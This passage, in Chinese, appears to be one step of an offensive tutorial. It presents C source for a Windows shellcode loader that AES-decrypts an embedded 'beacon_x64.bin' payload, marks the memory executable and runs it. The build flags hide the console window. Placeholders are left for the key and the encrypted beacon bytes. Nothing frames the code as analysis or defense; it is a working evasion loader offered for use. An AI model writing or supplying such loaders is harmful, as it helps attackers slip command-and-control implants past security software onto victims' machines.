**第二步：AES-256 + 分块异或加载器（C 源码，MinGW 交叉编译）**

```c
// loader.c ——  x86_64-w64-mingw32-gcc loader.c -o loader.exe -O2 -s -mwindows
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

static unsigned char key[32] = { /* 32 字节随机 key，写死或运行时从资源派生 */ 0 };
static unsigned char iv[16]  = { /* 16 字节 */ 0 };

// [在此粘贴 beacon_x64.bin 的 AES-CBC 密文数组]
static unsigned char enc[] = { 0x00 };

int main(void) {
    HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey;
    DWORD len = sizeof(enc), outLen = 0;
    unsigned char *buf = (unsigned char *)VirtualAlloc(NULL, len + 4096,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, 32, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    // 头部 16 字节存原始长度
    DWORD origLen = *(DWORD *)enc;
    CryptDecrypt(hKey, 0, TRUE, 0, enc + 16, &origLen);
    memcpy(buf, enc + 16, origLen);

    DWORD old;
    VirtualProtect(buf, origLen, PAGE_EXECUTE_READ, &old);

    // 直接调用（配合下方回调/纤程二选一）
    ((void(*)())buf)();
    return 0;
}
```

